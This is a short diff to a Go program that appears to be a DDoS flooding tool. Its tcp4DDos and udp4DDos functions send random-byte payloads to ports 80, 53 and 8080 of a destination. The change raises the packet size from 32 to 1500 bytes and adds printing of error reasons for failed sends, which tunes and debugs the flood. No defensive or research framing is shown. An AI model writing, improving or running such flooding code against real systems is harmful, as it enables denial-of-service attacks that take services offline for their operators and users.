@@ -14,7 +14,7 @@ var (
 	//destination = "127.0.0.1"
 	ports = []int{80, 53, 8080}
 	//source      = []string{"127.0.0.1", "192.168.0.1"}
-	dataSize = 32
+	dataSize = 1500
 )
 
 func GenRandomBytes(size uint) (blk []byte, err error) {
@@ -28,6 +28,7 @@ func tcp4DDos(source *net.TCPAddr, destination *net.TCPAddr, size uint, interval
 		time.Sleep(time.Duration(interval) * time.Second)
 		if err != nil {
 			fmt.Printf("%s	%s -> %s	TCP	%d FAILED\n", time.Now().Format("2006-01-02 15:04:05"), source.String(), destination.String(), size)
+			fmt.Println("Reason: " + err.Error())
 			continue
 		}
 		data, _ := GenRandomBytes(size)
@@ -41,6 +42,7 @@ func udp4DDos(source *net.UDPAddr, destination *net.UDPAddr, size uint, interval
 		time.Sleep(time.Duration(interval) * time.Second)
 		if err != nil {
 			fmt.Printf("%s	%s -> %s	UDP	%d FAILED\n", time.Now().Format("2006-01-02 15:04:05"), source.String(), destination.String(), size)
+			fmt.Println("Reason: " + err.Error())
 			continue
 		}
 		data, _ := GenRandomBytes(size)
